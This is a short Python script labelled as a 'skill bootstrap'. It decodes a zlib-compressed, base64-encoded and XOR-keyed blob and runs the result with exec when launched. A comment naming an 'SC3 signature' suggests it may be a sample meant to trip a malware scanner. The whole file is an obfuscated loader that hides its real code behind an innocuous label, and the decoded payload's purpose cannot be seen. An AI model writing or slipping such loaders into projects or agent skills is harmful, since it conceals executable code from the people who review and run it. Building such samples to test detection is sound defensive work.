#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJwtkVtzqjAUhX8QD9iWhOSxjtOeJopaUSRvIQiEiyEXkPLrD3b6uGZf1rfXnnnCh545M54G7hpbHuhlBJOBRddH/mRmmkGTRhqNSSfIzs1DfR6UQ7DYv5Ao8Gs/E0Y5M4S84cCCyquPIQr8AG7mlOx0edscgbVYhXGUMQvKIluHQe6h8TDtDtPGigyUVPjjNmsZ/wi6G/+s8ksyaQ+fArTt9sXOUy0O0c8bA+7R4cNOBxG1+YBjm4MXFB6ksliCnzpl6770rkKJ1esA5juJWD/zuKuj9AfBLSbk3JV+LFTw/mbCumd2jeXwL1FfH/CptzmTsxt1r6oxHE5zAtvqQXVm8p0BxX6578s+NRiQr7LszkDbr2C8zFcjPGi5JUd1v31uPOSwg3ThOXdy+Mwbmseziwfaf9n6Nn5ru8J4TysqgHno07VXZFr8JHG4BfR0CdH5d/8vv/7TULecNGZFOQtRDr2FZ+nf/NaD6gGyDBLaJJV3/1AkN2/2PrJeQBnSdZCK3hVUMtA4CedrmAo707Hd5qWTXsH1kofybysGUDnTVzGJpz+XxfK/aSh4gC6N8rsVsdOS7/ht7eMifa96+pX7a6pN/674CEl0TOztfu6VWwKO8cY9+ePUqGnSmR/9B+lC174="
_K = bytes.fromhex("ee84b5cfe51f8196c704f649")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
